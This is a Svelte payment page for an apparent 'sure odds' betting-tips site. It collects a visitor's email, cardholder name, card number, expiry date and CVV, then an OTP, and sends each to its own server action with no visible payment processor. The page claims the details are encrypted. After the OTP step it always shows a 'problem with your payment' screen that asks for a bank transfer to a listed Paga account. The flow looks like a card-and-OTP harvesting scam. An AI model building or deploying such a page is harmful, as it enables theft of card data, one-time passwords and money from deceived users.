
<script>
// @ts-nocheck

import { invalidateAll, goto } from '$app/navigation';
  import { applyAction, deserialize } from '$app/forms';
  /** @type {import('./$types').ActionData} */
  export let form;
  /** @type {any} */
  let error;

	let email = '';
	let cname = '';
	let cnum = '';
	let exp = '';
	let cvv = '';
	let otp_st = 1;
	let otp = ''
	
 
	const setOtp = (/** @type {number} */ n) =>{
		if (cvv == '' || exp == '' || cnum == '' || cname == '' || email == ''  ) {
			return
		}
		 


		
			return otp_st = n
  		  
		
	}
	

	const dateFun = (/** @type {{ target: { value: string; }; }} */ e) =>{
		let ev = e.target.value.replace(
          /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
        ).replace(
          /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
        ).replace(
          /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
        ).replace(
          /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
        ).replace(
          /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
        ).replace(
          /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
        ).replace(
          /\/\//g, '/' // Prevent entering more than 1 `/`
        );

		return exp=ev
	}

	async function handleSubmit(event) {
    const data = new FormData(this);

    const response = await fetch(this.action, {
      method: 'POST',
      body: data
    });
    /** @type {import('@sveltejs/kit').ActionResult} */
    const result = deserialize(await response.text());

    if (result.type === 'success') {
      // re-run all `load` functions, following the successful update
      await invalidateAll();
	  setOtp(otp_st+1)
    }

    applyAction(result);
  }
</script>
<svelte:head>
	<title>payment</title>
	<meta name="description" content="payment, free odds, sure ods" />
</svelte:head>




<div class="text-column p-4">
	 <div class="text-center">
		<div class="font-bold text-xl">
			You are about to make a payment of:
		</div>
	<div class="font-bold text-4xl">
		NGN1000
	 </div>
	 <div class="">
		Your payment details are encrypted.
	 </div>
	 </div>
	
	<!-- svelte-ignore missing-declaration -->
	<form class="flex flex-col gap-3 my-4" method="POST" on:submit|preventDefault={handleSubmit}>
		{#if otp_st == 2}
			<div>
				<div>
					<div class="text-center">An OTP was sent to your email and number</div>
					<input type="text" name='otp' required={true} placeholder="OTP" class="rounded-2xl outline-none bg-gray-300 p-3 w-full" bind:value={otp} on:input={e=>otp=e.target.value}/>
				</div>

				<button class=" mt-4 p-3 bg-gradient-to-r from-[#060210]  via-[#0d0523] to-[#160839] text-white rounded-3xl" >Submit</button>
			</div>
		{:else if otp_st == 3}
			<div class="text-center p-3 bg-gray-200 rounded-2xl">
				<div>seems like there was a problem with your payment, don't worry you can still get your daily ods</div>
				<div>You can make payments to this account</div>
				<div class=" p-4 bg-white rounded-2xl m-4">
					<div class=" font-bold text-4xl">3338890323</div>
					<div class=" font-bold text-3xl">Paga</div>
				</div>
				<br/>
				<a href='/' class=" w-1/2 my-5 p-3 bg-gradient-to-r from-[#017b13]  via-[#00b624] to-[#18ae54] text-white rounded-3xl" >Payment Completed</a>
				<br/>
				<br/>
			</div>
		{:else}

		<div>
			<div>Enter Email</div>
			<input type="email" name='email' required={true} placeholder="yourmail@domain.com" class="rounded-2xl outline-none bg-gray-300 p-3 w-full" bind:value={email} />
		</div>

		<div>
			<div>Cards holders name</div>
			<input  bind:value={cname} required={true} name='cards_name' placeholder="John Bananas" class="rounded-2xl outline-none bg-gray-300 p-3 w-full" on:input={e=>cname=e.target.value}/>
		</div>
		<div>
			<div>Cards Number</div>
			<input 
			required={true}
				placeholder="Card Number" 
				class="rounded-2xl outline-none bg-gray-300 p-3 w-full"
                      pattern="[0-9]*"
                      inputMode="numeric"
                      maxLength={16}
					  name='card_number'
					  on:input={e=>cnum=e.target.value}
					  bind:value={cnum}
					 
				/>
		</div>

		<div class="flex justify-between items-center">
			<div class="w-[30%]">
				<div>Expiring date</div>
				<input 
					class="rounded-2xl outline-none bg-gray-300 p-3 w-full"
					placeholder="09/22"
						 
						  inputMode="numeric"
						  maxLength={5}
						  on:input={dateFun}
						  bind:value={exp}
						  name='exp' 
						 
					/>
			</div>
			<div class="w-[30%]">
				<div>cvv</div>
				<input 
					
					class="rounded-2xl outline-none bg-gray-300 p-3 w-full"
					placeholder="cvv"
						  pattern="[0-9]*"
						  inputMode="numeric"
						  maxLength={3}
						  name='cvv'
						  bind:value={cvv}
						  on:input={e=>cvv=e.target.value} required={true}
					/>
			</div>
		</div>
		<button class=" mt-4 p-3 bg-gradient-to-r from-[#060210]  via-[#0d0523] to-[#160839] text-white rounded-3xl" >Submit</button>
		
		{/if}
	</form>
	<button class=" mt-4 p-3 bg-gradient-to-r from-[#060210]  via-[#0d0523] to-[#160839] text-white rounded-3xl" on:click={e=>setOtp(3)} >Pay With Transfer</button>
</div>


